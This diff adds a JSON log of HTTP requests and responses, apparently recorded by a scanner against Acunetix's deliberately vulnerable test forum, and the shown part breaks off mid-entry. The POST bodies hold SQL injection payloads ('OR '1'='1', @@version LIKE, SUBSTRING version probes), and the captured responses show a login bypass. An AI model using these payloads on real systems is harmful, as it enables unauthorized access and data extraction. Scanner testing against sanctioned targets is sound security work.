@@ -1,0 +1,752 @@
+{
+ "pr-0001": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=sentinel&tfUPass=1%27+OR+%271%27%3D%271%27+--"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:46 GMT",
+    "content-length": "6143"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum Acunetix Web Vulnerability Scanner</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Logout.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">logout sentinel</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t<div class=\"path\">\r\n\t\t\tAcunetix Web Vulnerability Scanner\r\n\t\t</div>\r\n\t<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">\r\n      <tr>\r\n        <td class=\"tableheader\">Thread</td>\r\n        <td class=\"tableheader\">Posts</td>\r\n\t\t<td class=\"tableheader\">Posted by</td>\r\n        <td class=\"tableheader\">Last Post</td>\r\n      </tr>   \r\n\t<tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=0'>1</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:25 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=1'>2</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:28 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=2'>3</a></div></td><td>2</td><td>admin</td><td>11/9/2005 1:08:52 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=3'>aaa</a></div></td><td>1</td><td>admin</td><td>11/9/2005 1:45:54 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=4'>tripscan — практический разбор возможностей сервиса для планирования поездок</a></div></td><td>1</td><td>NicholasevozY</td><td>10/4/2026 5:39:34 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=5'>tripscan — Пошаговый разбор : от первой поездки до сложных маршрутов</a></div></td><td>1</td><td>ThomasHusia</td><td>10/4/2026 5:39:55 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=6'>tripscan — в ежедневном режиме: как устроена повседневная работа с сервисом</a></div></td><td>1</td><td>Victorinpub</td><td>10/4/2026 5:45:23 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=7'>Compare Gift Cards</a></div></td><td>1</td><td>LloydObems</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=8'>Compare Gift Cards</a></div></td><td>1</td><td>JamesBrins</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=9'>Кракен сайт вход недорогой кракен велосипед отзывы</a></div></td><td>1</td><td>DmuiApamy</td><td>10/4/2026 5:55:55 PM</td></tr>\r\n\t</table>\r\n\t\r\n      <!-- tinyMCE -->\r\n      <script language=\"javascript\"",
+   "size": 5931,
+   "redirect_chain": [
+    [
+     302,
+     "http://testasp.vulnweb.com/showforum.asp?id=0"
+    ]
+   ]
+  },
+  "label": "control_true",
+  "t": 1791137088.158
+ },
+ "pr-0002": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=sentinel&tfUPass=1%27+OR+%271%27%3D%272%27+--"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:47 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "control_false",
+  "t": 1791137088.993
+ },
+ "pr-0003": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=sentinel&tfUPass=1%27+OR+%40%40version+LIKE+%27%25%27+--"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:47 GMT",
+    "content-length": "6143"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum Acunetix Web Vulnerability Scanner</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Logout.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">logout sentinel</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t<div class=\"path\">\r\n\t\t\tAcunetix Web Vulnerability Scanner\r\n\t\t</div>\r\n\t<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">\r\n      <tr>\r\n        <td class=\"tableheader\">Thread</td>\r\n        <td class=\"tableheader\">Posts</td>\r\n\t\t<td class=\"tableheader\">Posted by</td>\r\n        <td class=\"tableheader\">Last Post</td>\r\n      </tr>   \r\n\t<tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=0'>1</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:25 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=1'>2</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:28 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=2'>3</a></div></td><td>2</td><td>admin</td><td>11/9/2005 1:08:52 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=3'>aaa</a></div></td><td>1</td><td>admin</td><td>11/9/2005 1:45:54 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=4'>tripscan — практический разбор возможностей сервиса для планирования поездок</a></div></td><td>1</td><td>NicholasevozY</td><td>10/4/2026 5:39:34 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=5'>tripscan — Пошаговый разбор : от первой поездки до сложных маршрутов</a></div></td><td>1</td><td>ThomasHusia</td><td>10/4/2026 5:39:55 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=6'>tripscan — в ежедневном режиме: как устроена повседневная работа с сервисом</a></div></td><td>1</td><td>Victorinpub</td><td>10/4/2026 5:45:23 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=7'>Compare Gift Cards</a></div></td><td>1</td><td>LloydObems</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=8'>Compare Gift Cards</a></div></td><td>1</td><td>JamesBrins</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=9'>Кракен сайт вход недорогой кракен велосипед отзывы</a></div></td><td>1</td><td>DmuiApamy</td><td>10/4/2026 5:55:55 PM</td></tr>\r\n\t</table>\r\n\t\r\n      <!-- tinyMCE -->\r\n      <script language=\"javascript\"",
+   "size": 5931,
+   "redirect_chain": [
+    [
+     302,
+     "http://testasp.vulnweb.com/showforum.asp?id=0"
+    ]
+   ]
+  },
+  "label": "version_true",
+  "t": 1791137089.319
+ },
+ "pr-0004": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=sentinel&tfUPass=1%27+OR+%40%40version+LIKE+%27zzz-sentinel-nope%25%27+--"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:48 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "version_false",
+  "t": 1791137090.171
+ },
+ "pr-0005": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=sentinel&tfUPass=1%27+OR+SUBSTRING%28%40%40version%2C1%2C1%29%3D%278%27+--"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:48 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "version_digit_8",
+  "t": 1791137090.524
+ },
+ "pr-0006": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=sentinel&tfUPass=1%27+OR+SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27+--"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:49 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "version_digit_5",
+  "t": 1791137090.887
+ },
+ "pr-0007": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D1",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
